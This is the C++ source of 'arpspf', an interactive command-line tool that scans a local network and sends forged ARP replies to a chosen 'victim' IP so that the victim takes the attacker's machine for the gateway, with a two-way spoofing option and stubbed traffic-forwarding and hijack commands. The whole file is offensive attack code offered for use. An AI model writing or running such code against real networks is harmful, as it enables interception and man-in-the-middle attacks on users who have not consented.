/*
 * Arguments:
 * victim's ip
 * how many packets
 * time interval
 * device name
 */


#include "arpspf.h"
#include "hdrs.h"
#include "netinfo.h"

#include <set>

#include <wordexp.h>

using namespace kni;

netinfo *netdb;
int keep_looping = 1;

#define APP_NAME "arpspf"

typedef void (*arpspf_func)(int, char *[]);

void arpspf_exit(int, char **);

void arpspf_spoof(int, char **);

void arpspf_scan_lan(int, char **);

void arpspf_forward(int, char **);

void arpspf_hijack(int, char **);

void arpspf_device(int, char **);

void fatal_error(const char *src, const char *err);


int main(int argc, char *argv[]) {
    if (argc == 1) {
        fatal_error(APP_NAME, "missing device name");
    } else if (strcmp(argv[1], "lo") == 0) {
        fatal_error(APP_NAME, "using lo doesn't make sense");
    }

    netdb = new netinfo(128);
    if (!netdb->set_dev(argv[1]) || !netdb->update_gateway()) {
        fatal_error(APP_NAME, netdb->error());
    }

    std::map<std::string, arpspf_func> arpspf_cmd;

    arpspf_cmd["exit"] = arpspf_exit;
    arpspf_cmd["scan"] = arpspf_scan_lan;
    arpspf_cmd["dev"] = arpspf_device;
    arpspf_cmd["spf"] = arpspf_spoof;
//    arpspf_cmd["fwd"] = arpspf_forward;
//    arpspf_cmd["hij"] = arpspf_hijack;

    arpspf_device(0, nullptr);
    arpspf_scan_lan(0, nullptr);

    while (keep_looping) {
        printf("> ");

        char *line_buf = nullptr;
        size_t bufsize = 0;

        int bytes;
        char dmt;
        if ((bytes = static_cast<int>(getline(&line_buf, &bufsize, stdin))) > 1) {

            dmt = line_buf[bytes - 1];
            line_buf[bytes - 1] = 0;
            LOG_DEBUG("cmd line:%s", line_buf);

            wordexp_t we{};
            int we_ret = wordexp(line_buf, &we, 0);

            if (we_ret == 0) {
                std::string name(we.we_wordv[0]);
                if (arpspf_cmd.count(name)) {
                    arpspf_cmd[name](static_cast<int>(we.we_wordc), we.we_wordv);
                } else {
                    LOG_ERROR("\"%s\" not found.\n", we.we_wordv[0]);
                }
            } else if (we_ret != WRDE_BADCHAR && we_ret != WRDE_SYNTAX) {
                keep_looping = 0;
            }

            wordfree(&we);
            line_buf[bytes - 1] = dmt;
        }

        free(line_buf);
    }

    delete netdb;
    return 0;
}

/*
 * use a map<string, mac> to store ip:mac pairs returned by nmap
 * sc - scan LAN ips using nmap
 *      sc
 * spf - perform LAN arp spoofing to hosts
 *      spf 192.168.225.187 -n 5 -c 100
 * fwd - forward network traffic between hosts
 *      fwd 192.168.225.187
 */

void arpspf_exit(int argc, char **argv) {
    LOG_DEBUG("%s()", __FUNCTION__);

    keep_looping = false;
}

/*
 * spf - perform LAN arp spoofing on a single host
 *      spf 192.168.225.187 -n 5 -c 100
 */
void arpspf_spoof(int argc, char **argv) {
    LOG_DEBUG("%s(argc=%d):", __FUNCTION__, argc);

    int opt;
    int seconds = 10, npackets = 10;
    bool twoway = false;
    while ((opt = getopt(argc, argv, "n:c:t")) != -1) {
        switch (opt) {
            case 'n':
                seconds = atoi(optarg);
                LOG_DEBUG("optarg=%s secs=%d", optarg, seconds);
                break;
            case 'c':
                npackets = atoi(optarg);
                LOG_DEBUG("optarg=%s pkts=%d", optarg, npackets);
                break;
            case 't':
                twoway = true;
                break;
            default:
                break;
        }
    }

    argc -= optind;
    argv += optind;

    if (seconds < 0 || npackets < 0) {
        LOG_ERROR("Invalid arguments.");
        return;
    }

    if (argc == 0) {
        LOG_ERROR("Missing an IP address.");
        return;
    }

    std::string victim_ip(argv[0]);
    if (netdb->cached(victim_ip) == 0) {
        LOG_ERROR("Host %s not detected.\n", argv[0]);
        printf("Run \"scan\" to discover LAN hosts\n");
        return;
    }

    u_char buf[128] = {};


    arp_attack attack(netdb, buf, sizeof(buf));

    if (!attack.open()) {
        LOG_ERROR("open():%s\n", attack.error());
        return;
    }

    attack.construct_packets();
    attack.apply_default_values();
    attack.set_fake_ip(netdb->gateway_ip);

    LOG_DEBUG("%s(): ip=%s secs=%d pkts=%d twoway=%d",
              __FUNCTION__, victim_ip.c_str(), seconds, npackets, twoway);
    for (int i = 0; i < npackets; ++i) {
        bool ret;
        if (twoway) {
            ret = attack.spoof(netdb->gateway_ip, victim_ip);
        } else {
            ret = attack.fake_reply_to(victim_ip);
        }

        if (!ret)
            LOG_ERROR("%s", attack.error());

        if (i != npackets - 1)
            sleep(static_cast<unsigned int>(seconds));

    }

}

void arpspf_scan_lan(int, char **) {
    LOG_DEBUG("%s()", __FUNCTION__);

    if (netdb->update_gateway() == -1) {
        LOG_ERROR("%s\n", netdb->error());
        return;
    }

    printf("Scanning hosts...\n");

    if (netdb->update_arp()) {
        for (auto &p: netdb->mapping()) {
            printf("ip: %s\t- mac: %s\n", p.first.c_str(), to_string(p.second).c_str());
        }
    } else {
        LOG_ERROR("%s\n", netdb->error());
    }

}

void arpspf_forward(int, char **) {
    LOG_DEBUG("%s()", __FUNCTION__);
}

void arpspf_hijack(int, char **) {
    LOG_DEBUG("%s()", __FUNCTION__);
}

void arpspf_device(int, char **) {
    LOG_DEBUG("%s()", __FUNCTION__);

    printf("Gateway:%s\n", netdb->gateway_ip.c_str());

    printf("Device \"%s\":\n", netdb->devname.c_str());

    auto netenv = &(netdb->devinfo);
    printf("\tHWaddr:%s Bcast:%s\n",
           to_string(netenv->hw_addr).c_str(),
           to_string(netenv->hw_bcast).c_str());
    printf("\tinet addr:%s Bcast:%s Mask:%s\n",
           to_string(netenv->ip).c_str(),
           to_string(netenv->ip_bcast).c_str(),
           to_string(netenv->ip_netmask).c_str());
}

